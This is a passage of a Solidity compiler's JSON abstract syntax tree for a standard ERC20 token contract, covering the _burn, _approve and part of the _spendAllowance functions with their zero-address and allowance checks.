																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 459,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "9949:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 458,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "9949:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 461,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "9949:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 462,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 408,
															"src": "9961:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 456,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 598,
														"src": "9931:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 463,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9931:37:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 464,
												"nodeType": "EmitStatement",
												"src": "9926:42:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"id": 466,
															"name": "account",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 406,
															"src": "9999:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"arguments": [
																{
																	"hexValue": "30",
																	"id": 469,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "10016:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 468,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "10008:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": {
																	"id": 467,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "10008:7:0",
																	"typeDescriptions": {}
																}
															},
															"id": 470,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "10008:10:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 471,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 408,
															"src": "10020:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 465,
														"name": "_afterTokenTransfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 585,
														"src": "9979:19:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 472,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "9979:48:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 473,
												"nodeType": "ExpressionStatement",
												"src": "9979:48:0"
											}
										]
									},
									"documentation": {
										"id": 404,
										"nodeType": "StructuredDocumentation",
										"src": "9061:309:0",
										"text": " @dev Destroys `amount` tokens from `account`, reducing the\n total supply.\n Emits a {Transfer} event with `to` set to the zero address.\n Requirements:\n - `account` cannot be the zero address.\n - `account` must have at least `amount` tokens."
									},
									"id": 475,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_burn",
									"nameLocation": "9384:5:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 409,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 406,
												"mutability": "mutable",
												"name": "account",
												"nameLocation": "9398:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 475,
												"src": "9390:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 405,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "9390:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 408,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "9415:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 475,
												"src": "9407:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 407,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "9407:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "9389:33:0"
									},
									"returnParameters": {
										"id": 410,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "9440:0:0"
									},
									"scope": 586,
									"src": "9375:659:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 519,
										"nodeType": "Block",
										"src": "10540:257:0",
										"statements": [
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 491,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 486,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 478,
																"src": "10558:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"arguments": [
																	{
																		"hexValue": "30",
																		"id": 489,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10575:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 488,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "10567:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 487,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "10567:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 490,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "10567:10:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "10558:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373",
															"id": 492,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "10579:38:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208",
																"typeString": "literal_string \"ERC20: approve from the zero address\""
															},
															"value": "ERC20: approve from the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208",
																"typeString": "literal_string \"ERC20: approve from the zero address\""
															}
														],
														"id": 485,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "10550:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 493,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10550:68:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 494,
												"nodeType": "ExpressionStatement",
												"src": "10550:68:0"
											},
											{
												"expression": {
													"arguments": [
														{
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 501,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 496,
																"name": "spender",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 480,
																"src": "10636:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"arguments": [
																	{
																		"hexValue": "30",
																		"id": 499,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "10655:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 498,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "10647:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 497,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "10647:7:0",
																		"typeDescriptions": {}
																	}
																},
																"id": 500,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "10647:10:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"src": "10636:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"hexValue": "45524332303a20617070726f766520746f20746865207a65726f2061646472657373",
															"id": 502,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "10659:36:0",
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029",
																"typeString": "literal_string \"ERC20: approve to the zero address\""
															},
															"value": "ERC20: approve to the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029",
																"typeString": "literal_string \"ERC20: approve to the zero address\""
															}
														],
														"id": 495,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															4294967278,
															4294967278
														],
														"referencedDeclaration": 4294967278,
														"src": "10628:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 503,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10628:68:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 504,
												"nodeType": "ExpressionStatement",
												"src": "10628:68:0"
											},
											{
												"expression": {
													"id": 511,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"baseExpression": {
															"baseExpression": {
																"id": 505,
																"name": "_allowances",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 21,
																"src": "10707:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																	"typeString": "mapping(address => mapping(address => uint256))"
																}
															},
															"id": 508,
															"indexExpression": {
																"id": 506,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 478,
																"src": "10719:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "IndexAccess",
															"src": "10707:18:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 509,
														"indexExpression": {
															"id": 507,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 480,
															"src": "10726:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "10707:27:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 510,
														"name": "amount",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 482,
														"src": "10737:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "10707:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 512,
												"nodeType": "ExpressionStatement",
												"src": "10707:36:0"
											},
											{
												"eventCall": {
													"arguments": [
														{
															"id": 514,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 478,
															"src": "10767:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 515,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 480,
															"src": "10774:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 516,
															"name": "amount",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 482,
															"src": "10783:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 513,
														"name": "Approval",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 607,
														"src": "10758:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 517,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "10758:32:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 518,
												"nodeType": "EmitStatement",
												"src": "10753:37:0"
											}
										]
									},
									"documentation": {
										"id": 476,
										"nodeType": "StructuredDocumentation",
										"src": "10040:412:0",
										"text": " @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n This internal function is equivalent to `approve`, and can be used to\n e.g. set automatic allowances for certain subsystems, etc.\n Emits an {Approval} event.\n Requirements:\n - `owner` cannot be the zero address.\n - `spender` cannot be the zero address."
									},
									"id": 520,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_approve",
									"nameLocation": "10466:8:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 483,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 478,
												"mutability": "mutable",
												"name": "owner",
												"nameLocation": "10483:5:0",
												"nodeType": "VariableDeclaration",
												"scope": 520,
												"src": "10475:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 477,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "10475:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 480,
												"mutability": "mutable",
												"name": "spender",
												"nameLocation": "10498:7:0",
												"nodeType": "VariableDeclaration",
												"scope": 520,
												"src": "10490:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 479,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "10490:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 482,
												"mutability": "mutable",
												"name": "amount",
												"nameLocation": "10515:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 520,
												"src": "10507:14:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 481,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "10507:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "10474:48:0"
									},
									"returnParameters": {
										"id": 484,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "10540:0:0"
									},
									"scope": 586,
									"src": "10457:340:0",
									"stateMutability": "nonpayable",
									"virtual": true,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 562,
										"nodeType": "Block",
										"src": "11168:321:0",
										"statements": [
											{
												"assignments": [
													531
												],
												"declarations": [
													{
														"constant": false,
														"id": 531,
														"mutability": "mutable",
														"name": "currentAllowance",
														"nameLocation": "11186:16:0",
														"nodeType": "VariableDeclaration",
														"scope": 562,
														"src": "11178:24:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 530,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "11178:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 536,
												"initialValue": {
													"arguments": [
														{
															"id": 533,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 523,
															"src": "11215:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"id": 534,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 525,
															"src": "11222:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														],
														"id": 532,
														"name": "allowance",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 141,
														"src": "11205:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_view$_t_address_$_t_address_$returns$_t_uint256_$",
															"typeString": "function (address,address) view returns (uint256)"
														}
													},
													"id": 535,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"nameLocations": [],
													"names": [],
													"nodeType": "FunctionCall",
													"src": "11205:25:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "11178:52:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 543,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 537,
														"name": "currentAllowance",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 531,
														"src": "11244:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"expression": {
															"arguments": [
																{
																	"id": 540,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "11269:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint256_$",
																		"typeString": "type(uint256)"
																	},
																	"typeName": {
																		"id": 539,
																		"name": "uint256",
																		"nodeType": "ElementaryTypeName",
																		"src": "11269:7:0",
																		"typeDescriptions": {}
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_type$_t_uint256_$",
																		"typeString": "type(uint256)"
																	}
																],
																"id": 538,
																"name": "type",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967269,
																"src": "11264:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_metatype_pure$__$returns$__$",
																	"typeString": "function () pure"
																}
															},
															"id": 541,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "functionCall",
															"lValueRequested": false,
															"nameLocations": [],
															"names": [],
															"nodeType": "FunctionCall",
															"src": "11264:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_magic_meta_type_t_uint256",
																"typeString": "type(uint256)"
															}
														},
														"id": 542,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"memberLocation": "11278:3:0",
														"memberName": "max",
														"nodeType": "MemberAccess",
														"src": "11264:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "11244:37:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 561,
												"nodeType": "IfStatement",
												"src": "11240:243:0",
												"trueBody": {
													"id": 560,
													"nodeType": "Block",
													"src": "11283:200:0",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"commonType": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		"id": 547,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"id": 545,
																			"name": "currentAllowance",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 531,
																			"src": "11305:16:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": ">=",
																		"rightExpression": {
																			"id": 546,
																			"name": "amount",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 527,
																			"src": "11325:6:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "11305:26:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	{
																		"hexValue": "45524332303a20696e73756666696369656e7420616c6c6f77616e6365",
																		"id": 548,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "string",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "11333:31:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_stringliteral_3b6607e091cba9325f958656d2b5e0622ab7dc0eac71a26ac788cb25bc19f4fe",
																			"typeString": "literal_string \"ERC20: insufficient allowance\""
																		},
																		"value": "ERC20: insufficient allowance"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		{
																			"typeIdentifier": "t_stringliteral_3b6607e091cba9325f958656d2b5e0622ab7dc0eac71a26ac788cb25bc19f4fe",
																			"typeString": "literal_string \"ERC20: insufficient allowance\""
																		}
																	],
																	"id": 544,
																	"name": "require",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967278,
																		4294967278
																	],
																	"referencedDeclaration": 4294967278,
																	"src": "11297:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																		"typeString": "function (bool,string memory) pure"
																	}
																},
																"id": 549,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"nameLocations": [],
																"names": [],
																"nodeType": "FunctionCall",
																"src": "11297:68:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 550,
															"nodeType": "ExpressionStatement",
															"src": "11297:68:0"
														},
														{
															"id": 559,
															"nodeType": "UncheckedBlock",
															"src": "11379:94:0",
															"statements": [
																{
																	"expression": {
																		"arguments": [
																			{
																				"id": 552,
																				"name": "owner",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 523,
																				"src": "11416:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			},
																			{
																				"id": 553,
																				"name": "spender",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 525,
																				"src": "11423:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				}
																			},
																			{
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 556,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"id": 554,
																					"name": "currentAllowance",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 531,
																					"src": "11432:16:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "-",
																				"rightExpression": {
																					"id": 555,
																					"name": "amount",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 527,
																					"src": "11451:6:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"src": "11432:25:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				},
																				{
																					"typeIdentifier": "t_address",
																					"typeString": "address"
																				},
																				{
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			],
																			"id": 551,
																			"name": "_approve",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 520,
																			"src": "11407:8:0",
